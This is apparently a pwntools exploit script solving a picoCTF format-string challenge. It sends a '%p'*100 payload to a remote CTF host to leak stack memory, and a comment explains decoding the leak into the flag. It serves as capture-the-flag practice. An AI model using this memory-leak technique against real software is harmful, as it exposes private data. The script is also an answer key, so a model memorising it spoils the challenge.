#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 58352)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    io.sendlineafter(b'>>', b'%p'*100)

    io.interactive()

if __name__ == "__main__":
    main()

# Use cyberchef to decode from hex and reverse the charaters and then in reversed four byte sequence we get the flag.
